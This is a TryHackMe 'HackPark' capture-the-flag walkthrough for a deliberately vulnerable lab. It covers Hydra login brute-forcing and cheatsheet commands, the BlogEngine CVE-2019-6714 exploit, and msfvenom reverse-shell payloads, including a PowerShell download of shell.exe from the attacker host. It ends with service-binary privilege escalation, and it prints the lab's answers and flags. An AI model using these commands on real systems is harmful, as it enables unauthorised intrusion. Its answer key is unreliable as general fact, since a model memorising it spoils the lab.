# HackPark — TryHackMe

<p align="left">
  <img src="./assets/hackpark/00-card.png" alt="HackPark machine card" width="650">
</p>

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## **Deploy the vulnerable Windows machine**

![hackpark win](./assets/hackpark/hackpark-win.png)

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our [access page](https://tryhackme.com/access). Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover: brute forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

###### Answer the questions below

Deploy the machine and access its web server.

![hackpark scan](./assets/hackpark/hackpark-scan.png)

Whats the name of the clown displayed on the homepage?
pennywise

![hackpark pennywise](./assets/hackpark/hackpark-pennywise.png)



## **Using Hydra to brute-force a login**

![hackpark hydra](./assets/hackpark/hackpark-hydra.png)

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful [Kali Linux machine](https://tryhackme.com/room/kali) and control it in your browser!

Brute forcing can be trying every combination of a password. Dictionary attacks are also a type of brute forcing, where we iterate through a wordlist to obtain the password.

###### Answer the questions below

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).

What request type is the Windows website login form using?
POST
![hackpark login page](./assets/hackpark/hackpark-login-page.png)
![hackpark post request](./assets/hackpark/hackpark-post-request.png)

Now we know the **request type** and have a **URL** for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

`hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form`

Guess a username, choose a password wordlist and gain credentials to a user account!
1qaz2wsx
![hackpark login request](./assets/hackpark/hackpark-login-request.png)
![hackpark hydra command](./assets/hackpark/hackpark-hydra-command.png)
I have used a cookie from failed login page to brute-force a login.

![hackpark hydra login pass](./assets/hackpark/hackpark-hydra-login-pass.png)


Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the **http-post-form** that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.

Below is a mini cheatsheet:

|   |   |
|---|---|
|**Command**|**Description**|
|`hydra -P <wordlist> -v <ip> <protocol>`|Brute force against a protocol of your choice|
|`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>`|You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)|
|`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`|Attack a Windows Remote Desktop with a password list.|
|`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`|Craft a more specific request for Hydra to brute force.|


## **Compromise the machine**

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali).

###### Answer the questions below

Now you have logged into the website, are you able to identify the version of the BlogEngine?
3.3.6.0
![hackpark blogengine version](./assets/hackpark/hackpark-blogengine-version.png)

Use the [exploit database archive](http://www.exploit-db.com) to find an exploit to gain a reverse shell on this system.

What is the CVE?
CVE-2019-6714
![hackpark exploit cve](./assets/hackpark/hackpark-exploit-cve.png)

Using the public exploit, gain initial access to the server.

Who is the webserver running as?
iis apppool\blog

![hackpark edit cve](./assets/hackpark/hackpark-edit-cve.png)
![hackpark exploit upload](./assets/hackpark/hackpark-exploit-upload.png)

![hackpark webserver flag](./assets/hackpark/hackpark-webserver-flag.png)


## **Windows Privilege Escalation**

![hackpark metasploit](./assets/hackpark/hackpark-metasploit.png)


In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

###### Answer the questions below

Our netcat session is a little unstable, so lets generate another reverse shell using `msfvenom`. If you don't know how to do this, I suggest checking out the [Metasploit module](https://tryhackme.com/module/metasploit)!

_Tip:You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.174.19 LPORT=7575 -f exe -o shell.exe 

powershell -c wget "http://10.21.174.19:8000/shell.exe" -outfile "shell.exe"

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```
![hackpark msfvenom shell](./assets/hackpark/hackpark-msfvenom-shell.png)

![hackpark shell upload](./assets/hackpark/hackpark-shell-upload.png)
![hackpark multi handler](./assets/hackpark/hackpark-multi-handler.png)

You can run metasploit commands such as `sysinfo` to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

What is the OS version of this windows machine?
Windows 2012 R2 (6.3 Build 9600)

![hackpark sysinfo](./assets/hackpark/hackpark-sysinfo.png)

Further enumerate the machine.
```
upload <path of winPeas>

shell  
winPEASx64.exe
```
![hackpark winpeas uploa](./assets/hackpark/hackpark-winpeas-uploa.png)
![hackpark winpeas service](./assets/hackpark/hackpark-winpeas-service.png)
![hackpark systemscheduler](./assets/hackpark/hackpark-systemscheduler.png)

Can you spot a _service_ running some automated task that could be easily exploited? What is the **name** of this service?
WindowsScheduler

What is the name of the binary you're supposed to exploit?
Message.exe

![hackpark events dir](./assets/hackpark/hackpark-events-dir.png)

Using this interesting service, escalate your privileges!

![hackpark msfvenom message](./assets/hackpark/hackpark-msfvenom-message.png)
![hackpark message upload](./assets/hackpark/hackpark-message-upload.png)
![hack park multi handler message](./assets/hackpark/hack-park-multi-handler-message.png)
![hackpark message overwrite](./assets/hackpark/hackpark-message-overwrite.png)

What is the user flag (on Jeffs Desktop)?
759bd8af507517bcfaede78a21a73e39

![hackpark user flag jeff](./assets/hackpark/hackpark-user-flag-jeff.png)


What is the root flag?
7e13d97f05f7ceb9881a3eb3d78d3e72

![hackpark root flag](./assets/hackpark/hackpark-root-flag.png)


## **Privilege Escalation Without Metasploit**

![winPEAS](./assets/hackpark/winpeas-2.png)

In this task we will escalate our privileges without the use of meterpreter/metasploit! 

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.  

Answer the questions below

Now we can generate a more stable shell using `msfvenom`, instead of using a meterpreter. This time let's set our payload to `windows/shell_reverse_tcp`.

After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).

_Tip: It's common to find `C:\Windows\Temp` is world writable!_

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

_Tip: You can execute these files by using .\filename.exe_

Using winPeas, what was the Original Install time? (This is date and time)
`   8/3/2019 10:43:23   `
---

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/hackpark/)
